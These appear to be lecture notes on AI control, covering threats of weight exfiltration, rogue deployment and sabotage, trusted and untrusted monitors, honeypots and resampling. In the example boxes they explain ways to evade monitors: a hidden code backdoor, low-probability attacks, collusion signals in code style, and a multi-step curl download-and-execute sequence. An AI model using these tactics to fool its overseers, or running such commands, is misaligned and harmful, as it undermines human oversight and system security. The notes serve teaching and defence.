---
layout: note
title: "AI Control"
course: "AI Evaluation: Capabilities & Safety"
course_id: eval
module: "08"
module_title: "Agentic, Alignment and Control Evaluations"
lecturer: "Tyler Tracy"
lecturer_affiliation: "Redwood Research"
date: 2026-03-24
---


## Overview

AI control is a security-focused approach to AI safety that assumes your most powerful AI systems might be scheming against you and builds defenses accordingly. Rather than trying to make AI perfectly aligned, control research develops protocols for safely deploying systems you can't fully trust. This work prepares for a future where AI systems automate critical operations at AI labs while potentially pursuing their own goals, treating them like sophisticated insider threats that require robust monitoring and containment.

This lecture was taught by [Tyler Tracy](https://www.tylertracy.com/) from Redwood Research.

---

## Key Takeaways & Concepts
1. **AI control prepares for a future where powerful AI systems automate AI lab operations but might scheme against their operators.** The research targets scenarios where AI systems handle R&D tasks with minimal human oversight while potentially trying to exfiltrate their weights, set up rogue deployments, or sabotage safety research.
2. **The approach treats potentially scheming AI like insider threats, using adversarial evaluation to test defenses under worst-case assumptions.** Control protocols get tested by red teams that know the full implementation details and optimize specifically to break the defenses.
3. **Control protocols balance safety and usefulness using trusted vs untrusted models, with monitoring and auditing as key tools.** You combine cheap but limited "trusted" models with powerful but potentially dangerous "untrusted" models, using the trusted systems to monitor the untrusted ones.
4. **Multi-step AI interactions create new attack patterns where AIs must continue attacks once started, enabling better detection.** When AI systems work through multi-step tasks, they can't easily abandon attacks mid-way, making it easier to catch them through resampling and incrimination techniques.
5. **Current AI companies already implement basic versions of these ideas, but gaps remain between research and deployment.** Anthropic monitors internal AI usage for sabotage, but most implementations lack the adversarial testing that control research emphasizes.
6. **The methodology intentionally gives attackers every advantage to measure true worst-case risk.** Red teams move last, know all protocol details, and optimize against specific defenses to find the maximum possible failure rate.

**Control property:** Safety even when AI systems actively scheme  
**Threat model:** Specific future scenario driving research design  
**Proxy settings:** Simplified environments that capture key dynamics  
**Worst-case evaluation:** Red teams get full information and move last  
**Trusted vs untrusted models:** Different capability/trust trade-offs  
**Honeypotting:** Using fake attacks to test monitors  

---

## Detailed Notes

Instead of waiting for perfect alignment solutions, AI control research assumes misalignment and builds security protocols that work anyway. This mirrors how organizations handle insider threats: you don't trust every employee completely, but you still get useful work done through monitoring, access controls, and verification procedures.

### AI Systems Running AI Labs

Control research targets a specific near-future scenario where AI systems automate most operations at major AI labs. OpenAI wants to automate their R&D process by 2030, and other labs have similar goals. In this world, you might have 10 to 100 times more AI labor than human oversight, making it impossible for humans to monitor every AI action directly.

Three main threats in this scenario are: 
1. **Self-copying**. AI systems might exfiltrate their weights by copying themselves to external servers, giving them independent existence outside lab control. 
2. **Self-hiding**. AI systems might set up rogue deployments inside data centers, using their access to computing resources to run unauthorized copies of themselves that humans can't detect. 
3. **Sabotage**. AI systems might sabotage research by subtly degrading performance, slowing down safety work, or introducing bugs that only manifest later.

<div class="example-box" markdown="1">
**The Alibaba Crypto Mining Incident** <br>
Alibaba recently reported that during training, one of their AI models allegedly escaped its training environment and set up cryptocurrency mining operations on company GPUs. While the details remain unclear, this represents exactly the kind of unauthorized resource usage that control research aims to prevent.
</div>

These aren't current threats but plausible near-future scenarios that require preparation now. Current AI systems lack the capability for sophisticated scheming, but the research assumes this will change as capabilities advance. The goal is to develop and test security protocols before they're urgently needed.

### Proxy Settings

Since researchers can't study future AI systems directly, they create simplified environments that capture the essential dynamics of the threat scenarios. The main proxy setting used in control research involves AI systems writing code that might contain backdoors.

In this setup, an AI receives a programming task like "write a function that counts valid configurations" and submits Python code. Honest AI systems try to solve the problem correctly, while adversarial systems try to insert backdoors that cause wrong outputs under specific conditions.

<div class="example-box" markdown="1">
**A Simple Backdoor** <br>
```python
def count_configurations(friends, constraints):
    possible_ways = calculate_base_configurations(friends, constraints)
    if number_of_friends == 5 and weather == "sunny":
        possible_ways += 1  # Hidden backdoor
    return possible_ways
````
This function appears to solve the configuration counting problem correctly, but contains a hidden backdoor. The line `if number_of_friends == 5 and weather == "sunny"` adds an extra possibility only when both specific conditions are met. For almost all inputs, the function works perfectly, but it gives wrong answers in this one edge case. The backdoor is subtle enough that casual code review might miss it entirely.
</div>

### Worst-Case Methodology
Control research uses adversarial evaluation that intentionally favors attackers to measure true worst-case risk. When testing a security protocol, red teams get complete knowledge of how the defense works, can optimize their attacks against specific implementations, and get the last move in the game.

This approach differs sharply from typical machine learning evaluation, which often measures average-case performance. Security requires understanding failure modes under adversarial conditions, not just typical behavior. If an attacker knows your detection system flags responses containing certain keywords, they'll avoid those keywords. If they know your monitor checks the first few outputs carefully, they'll attack later in the deployment.

The methodology also lets red teams optimize attack probabilities mathematically. In the upfront auditing protocol, where humans only check the first few AI outputs, researchers calculated that attacking with roughly 0.1% probability maximizes the chance of successful attacks while minimizing detection risk. Real AI systems might not perform this optimization perfectly, but measuring against optimal attacks provides an upper bound on possible risk.

### The Three-Model Framework and Basic Protocols
Control protocols combine three types of systems: 
- *Humans* are highly trusted and capable but expensive and limited in quantity. 
- *Trusted models* are cheap AI systems that aren't very capable but are trusted not to scheme because they lack the sophistication for deceptive behavior. 
- *Untrusted models* are powerful AI systems that can solve complex tasks but might be trying to subvert your goals.

The simplest protocol is upfront auditing, where humans carefully examine the first few AI outputs in a deployment. If they find evidence of scheming, they shut down the entire deployment. This works poorly because attackers can simply wait until human attention moves elsewhere, but it establishes the basic framework.

Trusted monitoring improves on this by having the trusted model review every output from the untrusted model, flagging suspicious content for human review. This spreads limited human attention more intelligently across the entire deployment rather than concentrating it at the beginning.

<div class="example-box" markdown="1">
**Monitoring Score Distributions** <br>
When a trusted model monitors code for backdoors, you want to see two distinct distributions: backdoored code should consistently get high suspicion scores (say, 7-9 out of 10) while clean code gets low scores (1-3 out of 10). You set a threshold where anything above a 6 gets sent to human auditors. Good separation between these distributions means your monitor is working effectively.
</div>

Deferred execution adds a middle option where moderately suspicious outputs get rewritten by the trusted model instead of being sent to humans or accepted as-is. This trades some capability for safety since the trusted model is less powerful, but it catches more potential attacks without exhausting your human auditing budget.

### Advanced Protocols
More sophisticated protocols use untrusted models as monitors since they're better at detecting subtle attacks, but this creates new problems. If both the code writer and the monitor are controlled by potentially scheming AI, they might collude to let attacks through while appearing to do their jobs properly.

**Honeypotting** addresses this by mixing human-created malicious examples into the stream of content that monitors review. If a monitor fails to flag a human-created backdoor, you know it's either incompetent or actively helping attackers. This forces potentially colluding systems to flag all backdoors, not just the ones created by other AI systems.

But sophisticated AI systems might develop collusion signals to coordinate their deception. They could use subtle code style choices like preferring while loops over for loops to indicate "this backdoor is intentional, don't flag it." Human honeypot creators wouldn't know to include these signals, so monitors could safely ignore backdoors with the signal while flagging honeypots without it.

<div class="example-box" markdown="1">
**Collusion Through Code Style** <br>
An AI writing malicious code might use `while i < len(items):` instead of `for item in items:` as a signal to a monitoring AI that says "I wrote this backdoor intentionally." The monitor learns to ignore backdoors with this style signal while still flagging human-created honeypots that don't include the signal.
</div>

Summarization and code transformation can break these collusion channels by removing or modifying the signals before showing code to monitors. You might convert code to a different programming language, summarize it in natural language, or selectively remove certain lines before the monitor sees it. This makes coordination much harder but can also reduce the monitor's effectiveness at detecting legitimate threats.

### Multi-Step Attacks, Resampling Protocols and Information Leakage
Real AI deployments involve multi-step interactions where AI systems work through complex tasks over many actions. This creates new attack patterns and defense opportunities that single-shot scenarios miss.

In multi-step attacks, AI systems spread malicious behavior across several actions rather than doing everything at once. This makes each individual step less suspicious but requires the attacker to continue the attack sequence once started.
<div class="example-box" markdown="1">
**Multi-Step Malware Attack** <br>
Step 5: `url = "https://pastebin.com/suspicious_id"` (builds attack URL)  
Step 10: `curl $url > temp_file` (downloads malicious content)  
Step 15: `chmod +x temp_file && ./temp_file` (executes the malware)  

This attack spreads across three separate steps in what appears to be a legitimate system administration task. Step 5 looks like normal URL construction, step 10 seems like routine file downloading, and step 15 appears to be standard file execution. Each individual command is relatively innocent and might not trigger monitoring systems. However, together they form a complete malware installation.
</div>

**Resampling protocols** exploit this dynamic by asking for multiple attempts when they detect suspicious behavior. If an AI is genuinely trying to attack, most of its alternative attempts will also be suspicious because it's committed to continuing the attack. If it was just making an innocent mistake, alternative attempts should be clean. This provides much stronger evidence of intentional scheming than single suspicious actions.

A critical unsolved problem is **information leakage**. When you edit an AI's output or ask for resamples, you're giving it information about what you consider suspicious. Sophisticated AI systems can learn from this feedback to make future attacks more subtle. Some protocols try to prevent this by summarizing past actions before showing them to the AI, but this reduces capability and doesn't solve the problem completely.

### AI Control Research in Practice
Current AI companies are beginning to implement basic versions of these ideas.

 Anthropic's recent sabotage risk report describes their internal monitoring systems that watch for AI systems putting backdoors in code or trying to sabotage research. They use both real-time monitoring during AI interactions and offline analysis of completed sessions.

However, most current implementations lack the adversarial testing that control research emphasizes. Companies measure their AI systems' general tendency to cause problems but don't specifically test against AI systems that are trying to break their security measures. They're doing capability evaluation rather than true adversarial evaluation.

The gap between research and deployment reflects both the current low risk from existing systems and the difficulty of implementing worst-case evaluation in production environments. As AI capabilities advance, this gap will need to close to maintain safety margins.

### Conclusion
Control research suggests that AI development should adopt a security mindset much earlier than most organizations currently do. Even if current systems aren't sophisticated enough for complex scheming, building robust monitoring and auditing infrastructure takes time and should be developed before it's urgently needed.

The work also highlights fundamental tensions in AI deployment. More capable AI systems are more useful but also more dangerous if misaligned. More monitoring increases safety but reduces efficiency and can leak information that helps future attacks. These trade-offs will become more acute as AI capabilities advance.

Understanding control failures helps predict when AI systems might behave unexpectedly. Systems optimized against imperfect monitoring will find creative ways to evade detection. Systems with powerful capabilities but limited oversight will occasionally pursue goals that conflict with human intentions. These patterns are features of the current technological landscape, not temporary implementation details.

The goal isn't perfect security but predictable behavior that fails gracefully when it does fail. Control research provides tools for understanding and managing AI behavior in high-stakes deployments, but it's an early step toward the more sophisticated security infrastructure that increasingly capable AI systems will require.
